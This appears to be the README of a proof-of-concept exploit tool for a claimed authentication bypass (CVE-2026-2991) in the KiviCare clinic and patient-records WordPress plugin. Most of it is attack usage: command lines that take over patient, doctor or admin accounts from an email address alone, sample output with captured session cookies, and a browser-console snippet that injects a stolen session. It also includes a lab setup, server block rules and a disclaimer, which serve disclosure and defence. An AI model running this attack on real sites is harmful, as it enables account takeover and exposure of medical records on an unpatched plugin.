# KiviCare-authentication-bypass-script-for-wordpress

# CVE-2026-2991 — KiviCare Authentication Bypass

## 📖 Description
This proof-of-concept (PoC) exploits a critical authentication bypass vulnerability in the **KiviCare – Clinic & Patient Management System (EHR)** WordPress plugin, versions **≤ 4.1.2**.

The `patientSocialLogin()` function (REST endpoint `/wp-json/kivicare/v1/auth/patient/social-login`) fails to validate social login access tokens. An unauthenticated attacker can provide any arbitrary string as a token and, using only a target user's email address, log in as that user.

- **For patient accounts**: Full account takeover, exposing sensitive medical records and personal data.
- **For non‑patient accounts (admins, doctors)**: The vulnerable code issues valid session cookies **before** the role check fires. Even though the API returns HTTP 403, the cookies are still replayable, leading to privilege escalation and full site compromise.

> **CVE ID**: CVE-2026-2991  
> **CVSS Score**: 9.8 (Critical)  
> **Affected versions**: KiviCare ≤ 4.1.2  
> **No patch available as of this disclosure**

---

## ⚙️ How It Works
1. The script sends a POST request to the vulnerable REST endpoint with the target email and a fake social login token.
2. The plugin incorrectly accepts the fake token and returns authentication cookies for the matching user.
3. For patients, the API responds with HTTP 200 and user data. For other roles, HTTP 403 is returned, but the cookies are still set in the response headers.
4. The script extracts the cookies and outputs a JavaScript snippet.
5. Pasting that snippet into the browser's developer console on the target site injects the session and redirects to the user's dashboard or admin panel.

---

 🚀 Usage

### Requirements
- Python 3.6+
- `requests` library

```bash
pip3 install requests
Basic Command
bash
python3 CVE-2026-2991.py --url <WORDPRESS_BASE_URL> --email <TARGET_EMAIL>
Options
Flag	Description
--url	Base URL of the WordPress installation (required)
--email	Email address of the target user (required)
--login-type	Social provider: google (default) or apple
--timeout	Request timeout in seconds (default: 10)
--useragent	Custom User-Agent header
Examples
Take over a patient account:

bash
python3 CVE-2026-2991.py --url http://192.168.56.104/wordpress --email patient@example.com
Extract admin session cookies from a 403 response:

bash
python3 CVE-2026-2991.py --url https://victim.com/wp --email admin@clinic.com
Use Apple as the claimed social provider:

bash
python3 CVE-2026-2991.py --url http://localhost:8080 --email doctor@example.com --login-type apple
📋 Example Output (Patient)
text
CVE-2026-2991  —  KiviCare Authentication Bypass
─────────────────────────────────────────────────
[*] Target   : http://192.168.56.104/wordpress
[*] Endpoint : /wp-json/kivicare/v1/auth/patient/social-login
─────────────────────────────────────────────────
[@] Checking KiviCare REST namespace...
[+] KiviCare REST namespace responded.
─────────────────────────────────────────────────
[*] Target email   : patient@example.com
[*] Login type     : google
[*] Access token   : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
─────────────────────────────────────────────────
[@] Sending social login request...
[*] HTTP 200
─────────────────────────────────────────────────
[+] Authentication bypass successful!
─────────────────────────────────────────────────
[+] Patient session data:
        User ID      : 42
        Username     : john_patient
        Display name : John Patient
        E-mail       : patient@example.com
        First name   : John
        Last name    : Patient
        Roles        : patient
─────────────────────────────────────────────────
[@] Auth cookies:
        wordpress_logged_in_abc123 = ...; path=/
        wp-settings-time-42         = ...
─────────────────────────────────────────────────
[+] Paste into browser console on the target site:

(() => {
  document.cookie = "wordpress_logged_in_abc123=...; path=/";
  window.location.href = "http://192.168.56.104/wordpress/my-account/";
})();
🧪 Lab Setup (Docker Compose)
A Docker lab is included to test the vulnerability safely.

bash
git clone https://github.com/joshuavanderpoll/CVE-2026-2991.git
cd CVE-2026-2991/docker
docker compose up -d
The lab creates a WordPress instance with KiviCare 4.1.2 and pre‑populated test accounts (patient, doctor, admin). After testing, shut down with docker compose down -v.

🛡️ Remediation
Immediately disable the KiviCare plugin on all production sites until an official patch is released.

Block the vulnerable endpoint at the web server level:

Apache: RewriteRule ^wp-json/kivicare/v1/auth/patient/social-login - [F]

Nginx: location ~ /wp-json/kivicare/v1/auth/patient/social-login { return 403; }

Use a Web Application Firewall (WAF) to block requests containing the /kivicare/v1/auth/patient/social-login path.

Audit server logs for POST requests to that endpoint and assume any user present during the exposure period is compromised.

📚 References
NVD Entry – CVE-2026-2991 (once published)

KiviCare Plugin on WordPress.org

Original PoC repository: github.com/joshuavanderpoll/CVE-2026-2991

⚠️ Legal Disclaimer
This tool is provided for educational purposes and authorized security testing only.
Unauthorized use against systems you do not own or have explicit written permission to test may violate local, state, and federal laws.
The author assumes no liability for misuse or damage caused by this software
